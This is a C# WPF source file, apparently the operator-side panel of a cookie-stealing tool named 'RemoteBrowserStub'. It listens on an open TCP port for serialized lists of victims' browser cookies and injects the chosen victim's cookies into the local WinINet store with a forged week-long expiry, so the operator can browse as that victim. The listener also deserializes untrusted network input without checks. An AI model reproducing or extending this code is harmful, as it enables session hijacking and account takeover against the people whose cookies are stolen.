using MahApps.Metro.Controls;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.ComponentModel;
using DynamicCookieLibrary.DynamicCookie;
using System.Net.Sockets;

namespace RemoteBrowserStub
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public class DomainEntry
    {
        public String Domain { get; set; }
        private int backing = 1;
        public DomainEntry(String Domain)
        {
            this.Domain = Domain;
        }
        public int Count
        {
            get
            {
                return backing;
            }
            set
            {
                backing = value;
            }
        }
        public override bool Equals(object obj)
        {
            if (obj is DomainEntry)
            {
                return Domain.Equals((obj as DomainEntry).Domain);
            }
            return false;
        }
        public override int GetHashCode()
        {
            return Domain.GetHashCode();
        }
    }
    public partial class MainWindow : MetroWindow
    {
        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool InternetSetCookie(string lpszUrlName, string lpszCookieName, string lpszCookieData);

        public const String homePage = "http://www.google.com/";
        private static TcpListener listener;

        public Stack<Uri> history = new Stack<Uri>();
        public ObservableCollection<DomainEntry> entries = new ObservableCollection<DomainEntry>();
        public ObservableCollection<Browser> browsers = new ObservableCollection<Browser>();
        public MainWindow()
        {
            InitializeComponent();
            listView.ItemsSource = entries;
            listView_Copy.ItemsSource = browsers;
            browser.Navigating += Browser_Navigating;
            browser.Navigate(homePage);
        }

        private void loadCookiesFromBrowser(Browser browser)
        {
            entries.Clear();
            foreach (Cookie cookie in browser.cookies)
            {
                String expires = (DateTime.Now + new TimeSpan(7, 0, 0, 0)).ToUniversalTime().ToString("ddd, dd-MMM-yyyy HH:mm:ss") + " GMT";
                String str = cookie.ToString() + "; expires = " + expires;
                InternetSetCookie(cookie.Domain + cookie.Path, null, str);
                DomainEntry entry = new DomainEntry(cookie.Domain);
                if (!entries.Contains(entry))
                {
                    entries.Add(new DomainEntry(cookie.Domain));
                }
                else
                {
                    entries[entries.IndexOf(entry)].Count++;
                }
            }
            listView.Items.SortDescriptions.Add(new SortDescription("Count", ListSortDirection.Descending));
        }

        private void Browser_Navigating(object sender, NavigatingCancelEventArgs e)
        {
            textBox1.Text = e.Uri.ToString();
            history.Push(e.Uri);
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key.Equals(Key.Enter))
            {
                String host = textBox1.Text;
                if (!host.StartsWith("http"))
                {
                    host = "http://" + host;
                }
                browser.Navigate(host);
            }
        }

        private void button_Copy1_Click(object sender, RoutedEventArgs e)
        {
            if (history.Count > 1)
            {
                history.Pop();
                browser.Navigate(history.Pop());
            }
        }

        private void button2_Click(object sender, RoutedEventArgs e)
        {
            String host = textBox1.Text;
            if (!host.StartsWith("http"))
            {
                host = "http://" + host;
            }
            browser.Navigate(host);
        }

        private void listView_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            Object obj = listView.SelectedItem;
            if (obj != null)
            {
                DomainEntry entry = obj as DomainEntry;
                browser.Navigate(entry.Domain);
            }
        }

        private void button_Copy_Click(object sender, RoutedEventArgs e)
        {
            listener = new TcpListener(IPAddress.Parse("0.0.0.0"), int.Parse(textBox.Text));
            listener.Start();
            button_Copy.Content = "LISTENING";
            new Thread(() =>
            {
                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    new Thread(() =>
                    {
                        try
                        {
                            TcpClient x = client;
                            NetworkStream stream = x.GetStream();
                            byte[] length = new byte[4];
                            stream.Read(length, 0, length.Length);
                            byte[] data = new byte[BitConverter.ToInt32(length, 0)];
                            for (int i = 0; i < data.Length; i++)
                            {
                                data[i] = (byte)stream.ReadByte();
                            }
                            List<Browser> obj = (List<Browser>)Serialization.deserialize(data);
                            foreach (Browser browser in obj)
                            {
                                Dispatcher.Invoke(new Action(delegate
                                {
                                    browsers.Add(browser);
                                }));
                            }
                        }
                        catch
                        {

                        }
                    }).Start();
                }
            }).Start();
        }

        private void listView_Copy_MouseDoubleClick(object sender, MouseButtonEventArgs e)
        {
            Object obj = listView_Copy.SelectedItem;
            if (obj != null)
            {
                Browser selectedBrowser = (Browser)obj;
                loadCookiesFromBrowser(selectedBrowser);
                browser.Navigate(homePage);
            }
        }
    }
}
